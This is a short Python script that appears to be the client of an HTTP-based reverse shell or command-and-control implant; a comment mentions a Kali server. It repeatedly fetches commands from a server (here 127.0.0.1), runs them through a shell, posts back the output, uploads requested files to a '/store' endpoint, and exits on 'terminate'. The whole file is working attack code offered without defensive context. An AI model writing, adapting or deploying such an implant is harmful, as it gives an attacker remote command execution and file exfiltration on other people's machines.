import shlex
import os
import  requests
import subprocess
from time import sleep

while True:
    server = "http://127.0.0.1"
    req = requests.get(server) # Send GET request to our kali server
    command = req.text # Store the received txt into command variable
    command = shlex.split(command)
    if 'terminate' in command:
        break
    elif "get" in command:
        dest = command[1]
        if os.path.exists(dest):
            url = server + "/store"
            files = {'file': open(dest, 'rb')}
            r = requests.post(url, files=files)
        else:
            post_response = requests.post(server, data="[-] Not able to find the file specified")

    else:
        CMD = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        post_response = requests.post(server, data=CMD.stdout.read())
        post_response = requests.post(server, data=CMD.stderr.read())
    sleep(1)
